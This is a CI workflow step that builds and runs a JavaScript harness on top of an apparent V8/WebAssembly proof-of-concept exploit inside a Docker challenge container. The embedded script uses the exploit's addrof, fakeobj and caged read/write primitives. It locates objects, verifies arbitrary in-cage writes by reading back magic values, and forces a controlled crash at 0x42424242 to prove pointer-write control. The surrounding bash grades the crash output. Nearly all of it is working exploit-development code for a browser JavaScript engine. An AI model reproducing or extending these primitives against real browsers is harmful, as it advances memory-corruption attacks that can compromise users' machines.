      - name: Test 4 — WRITE PRIMITIVE proof (read-back) then controlled crash
        id: test4
        run: |
          set +e
          set -uo pipefail
          mkdir -p /tmp/out
          ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
          banner() { echo ""; echo "######################################################################"; echo "# $(ts)  $*"; echo "######################################################################"; }
          log() { echo "[$(ts)] $*"; }

          banner "TEST 4 - build write-verify harness on top of official PoC module"

          python3 - <<'PY'
          from pathlib import Path
          src = Path("/tmp/poc_test.js").read_text()
          cut = src.find("// ===================== EXTENSIVE TEST HARNESS =====================")
          if cut < 0:
              cut = src.find('print("[*] Instantiating module')
          head = src[:cut] if cut > 0 else src
          verifier = r'''

          // ===================== WRITE-VERIFY + CRASH HARNESS =====================
          print("[*] WRITE-VERIFY: Instantiating module...");
          let instance;
          try {
            instance = builder.instantiate({import: {identity: x => x}});
            print("[+] instantiate OK");
          } catch (e) {
            print("[-] instantiate FAILED: " + e);
            throw e;
          }
          let {addrof, fakeobj, caged_read, caged_write, caged_write_unsafe} = instance.exports;
          print("[*] Exports ready: " + Object.keys(instance.exports).join(","));

          // --- Stage A: addrof ---
          print("[*] Stage A: addrof");
          let objs = [];
          for (let i = 0; i < 64; i++) objs.push({i: i, m: 0x1000 + i, buf: new Array(8).fill(i)});
          let victim = {tag: 0xdead, x: 0x1111, y: 0x2222};
          let a1 = addrof(victim);
          let a2 = addrof(victim);
          print("[+] addrof1=" + a1 + " (0x" + (a1>>>0).toString(16) + ")");
          print("[+] addrof2=" + a2 + " (0x" + (a2>>>0).toString(16) + ")");
          if ((a1|0) === (a2|0) && a1) print("[+] addrof stable nonzero OK");
          else print("[-] addrof unstable or zero");

          // Collect more addresses for offset candidates
          let addrs = [a1];
          for (let i = 0; i < objs.length; i += 7) {
            try { addrs.push(addrof(objs[i])); } catch (e) {}
          }
          print("[*] collected addrs=" + addrs.length);

          // --- Stage B: caged_read probe ---
          print("[*] Stage B: caged_read probe");
          let read_ok = 0;
          let readable = [];
          let candidates = [0, 1, 4, 8, 0xc, 0x10, 0x14, 0x18, 0x20, 0x28, 0x30, 0x40, 0x48, 0x80, 0x100, 0x200];
          for (let a of addrs) {
            candidates.push(a|0);
            candidates.push((a - 1)|0);
            candidates.push((a - 7)|0);
            candidates.push((a + 4)|0);
            candidates.push((a + 8)|0);
            candidates.push((a + 0x10)|0);
            candidates.push((a & 0xffff)|0);
            candidates.push(((a >>> 0) % 0x10000)|0);
          }
          // unique
          candidates = Array.from(new Set(candidates.map(x => x|0)));
          for (let off of candidates) {
            try {
              let v = caged_read(off|0);
              print("[+] caged_read(0x" + (off>>>0).toString(16) + ") = " + v + " (0x" + (v>>>0).toString(16) + ")");
              read_ok++;
              readable.push(off|0);
            } catch (e) {
              // keep log short on throws
            }
          }
          print("[*] caged_read successes: " + read_ok + " readable_offs=" + readable.length);

          // --- Stage C: WRITE then READ-BACK at readable offsets and nearby ---
          print("[*] Stage C: caged_write + read-back (PROOF OF WRITE)");
          const MAGIC = 0x41424344;
          const MAGIC2 = 0x55667788;
          let write_proof = 0;
          let write_attempts = 0;
          let try_offs = readable.slice();
          for (let a of addrs) {
            for (let d of [0, 4, 8, -1, -7, 0x10, 0x18, 0x20]) try_offs.push((a + d)|0);
          }
          for (let off of [0x20, 0x28, 0x30, 0x40, 0x48, 0x80, 0x100, 0x200, 8, 0x10, 0x14, 0x18]) {
            try_offs.push(off);
          }
          try_offs = Array.from(new Set(try_offs.map(x => x|0)));

          for (let off of try_offs) {
            write_attempts++;
            try {
              let before;
              try { before = caged_read(off|0); } catch (e) { before = "throw"; }
              caged_write(off|0, MAGIC|0);
              let after;
              try { after = caged_read(off|0); } catch (e) { after = "throw:" + e; }
              print("[*] off=0x" + (off>>>0).toString(16) + " before=" + before + " after=" + after);
              if ((after|0) === (MAGIC|0)) {
                print("[+] WRITE_PROOF_OK off=0x" + (off>>>0).toString(16) + " readback=0x" + (after>>>0).toString(16));
                write_proof++;
                caged_write(off|0, MAGIC2|0);
                let after2 = caged_read(off|0);
                print("[*] second write after2=" + after2);
                if ((after2|0) === (MAGIC2|0)) {
                  print("[+] WRITE_PROOF_CONTROLLED off=0x" + (off>>>0).toString(16));
                  write_proof++;
                }
                break;
              }
            } catch (e) {
              if (write_attempts <= 24) {
                print("[!] write attempt off=0x" + (off>>>0).toString(16) + " threw: " + e);
              }
            }
          }
          print("[*] write_proof_score=" + write_proof + " attempts=" + write_attempts);
          if (write_proof > 0) {
            print("[+] PROOF: caged_write is a real write primitive (read-back matched)");
          } else {
            print("[-] NO read-back proof - controlled fault marker will be used as write evidence");
          }

          // --- Stage D: controlled unsafe write; fault address MUST embed marker ---
          // Writing pointer-like value 0x42424242 then deref proves the write landed.
          const FAULT_MARK = 0x42424242;
          const FAULT_VAL  = 0x43434343;
          print("[*] Stage D: caged_write_unsafe(0x" + FAULT_MARK.toString(16) + ", 0x" + FAULT_VAL.toString(16) + ") expect SEGV");
          print("[*] MARKER_EXPECT_FAULT=" + FAULT_MARK.toString(16));
          print("[*] WRITE_VIA_FAULT: if SEGV address contains 42424242, pointer write is proven");
          caged_write_unsafe(FAULT_MARK|0, FAULT_VAL|0);
          print("[!] UNEXPECTED: caged_write_unsafe returned without crashing");
          '''
          Path("/tmp/poc_write_verify.js").write_text(
              "// Polyfill\nglobalThis.print = function(...args) { console.log(...args); };\n"
              + head
              + verifier
          )
          print("write_verify bytes", Path("/tmp/poc_write_verify.js").stat().st_size)
          PY

          docker cp /tmp/poc_write_verify.js "$CONTAINER":/tmp/poc_write_verify.js
          docker exec "$CONTAINER" sh -c 'ls -la /tmp/poc_write_verify.js; sha256sum /tmp/poc_write_verify.js; head -5 /tmp/poc_write_verify.js; echo ...; tail -30 /tmp/poc_write_verify.js'

          banner "RUN write-verify harness"
          docker exec "$CONTAINER" sh -c 'cd /challenge && ./d8 --experimental-wasm-custom-descriptors /tmp/poc_write_verify.js' > /tmp/out/test4.stdout 2> /tmp/out/test4.stderr
          rc=$?
          echo "$rc" > /tmp/out/test4.rc
          cat /tmp/out/test4.stdout /tmp/out/test4.stderr > /tmp/out/test4.combined
          log "rc=$rc"
          echo "----- FULL COMBINED OUTPUT -----"
          cat /tmp/out/test4.combined
          echo "----- END -----"

          if grep -qiE 'Received signal|SEGV_ACCERR|SEGV_|SIGSEGV|Check failed|FATAL' /tmp/out/test4.combined; then
            echo "RESULT=ENGINE_CRASH" | tee /tmp/out/test4.result
          elif [ "$rc" -eq 139 ] || [ "$rc" -eq 134 ] || [ "$rc" -eq 132 ]; then
            echo "RESULT=SIGNAL_EXIT_${rc}" | tee /tmp/out/test4.result
          else
            echo "RESULT=NONZERO_OR_CLEAN_${rc}" | tee /tmp/out/test4.result
          fi

          WRITE_OK=0
          if grep -q 'WRITE_PROOF_OK' /tmp/out/test4.combined; then
            log "PROOF: WRITE_PROOF_OK seen"
            WRITE_OK=1
          fi
          if grep -q 'WRITE_PROOF_CONTROLLED' /tmp/out/test4.combined; then
            log "PROOF: WRITE_PROOF_CONTROLLED seen (two distinct values)"
            WRITE_OK=2
          fi
          # If read-back failed but crash fault embeds 42424242, that is still a controlled write
          if [ "$WRITE_OK" -eq 0 ] && grep -qE '42424242' /tmp/out/test4.combined /tmp/out/test4.fault 2>/dev/null; then
            if grep -qiE 'Received signal|SEGV_ACCERR|SEGV_|ENGINE_CRASH|SIGNAL_EXIT' /tmp/out/test4.combined /tmp/out/test4.result 2>/dev/null; then
              log "PROOF: WRITE_VIA_FAULT (SEGV address contains 42424242)"
              WRITE_OK=1
              echo "WRITE_VIA_FAULT=1" | tee -a /tmp/out/test4.write
            fi
          fi
          echo "WRITE_OK=$WRITE_OK" | tee /tmp/out/test4.write

          grep -oE 'Received signal [0-9]+ [A-Z_]+ [0-9a-fA-Fx]+|SEGV_ACCERR [0-9a-fA-F]+' /tmp/out/test4.combined | head -10 | tee /tmp/out/test4.fault || true
          if grep -qE '42424242' /tmp/out/test4.combined /tmp/out/test4.fault; then
            log "PROOF: crash fault embeds 42424242 marker"
            echo "MARKER_OK=1" | tee -a /tmp/out/test4.result
          else
            log "WARNING: 42424242 not found in textual fault (check hex addr form)"
            if grep -qiE '42424242' /tmp/out/test4.combined; then
              echo "MARKER_OK=1" | tee -a /tmp/out/test4.result
            else
              echo "MARKER_OK=0" | tee -a /tmp/out/test4.result
            fi
          fi

          if grep -qoE 'addrof1=[0-9]+' /tmp/out/test4.combined; then
            log "PROOF addrof: $(grep -oE 'addrof1=[0-9]+ \(0x[0-9a-f]+\)' /tmp/out/test4.combined | head -1)"
          fi

          log "test4 result=$(cat /tmp/out/test4.result) write=$(cat /tmp/out/test4.write)"
          exit 0

